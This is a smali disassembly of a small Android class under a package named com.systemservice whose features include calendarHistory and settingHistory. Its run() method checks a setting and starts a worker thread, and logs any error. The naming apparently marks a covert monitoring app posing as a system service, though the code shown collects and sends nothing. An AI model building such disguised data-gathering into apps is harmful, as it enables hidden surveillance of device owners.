.class final Lcom/systemservice/common/features/calendarHistory/c;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/common/features/calendarHistory/CalendarReceiver;->a(Landroid/content/Context;Lcom/systemservice/a/h/e;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Ljava/lang/String;

.field final synthetic c:Ljava/util/List;

.field final synthetic d:Lcom/systemservice/a/h/e;


# direct methods
.method constructor <init>(Landroid/content/Context;Ljava/lang/String;Ljava/util/List;Lcom/systemservice/a/h/e;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/common/features/calendarHistory/c;->a:Landroid/content/Context;

    iput-object p2, p0, Lcom/systemservice/common/features/calendarHistory/c;->b:Ljava/lang/String;

    iput-object p3, p0, Lcom/systemservice/common/features/calendarHistory/c;->c:Ljava/util/List;

    iput-object p4, p0, Lcom/systemservice/common/features/calendarHistory/c;->d:Lcom/systemservice/a/h/e;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    :try_start_0
    iget-object v0, p0, Lcom/systemservice/common/features/calendarHistory/c;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/systemservice/common/features/calendarHistory/b;

    invoke-direct {v1, p0}, Lcom/systemservice/common/features/calendarHistory/b;-><init>(Lcom/systemservice/common/features/calendarHistory/c;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    const-string v1, "TAG"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    :goto_0
    return-void
.end method
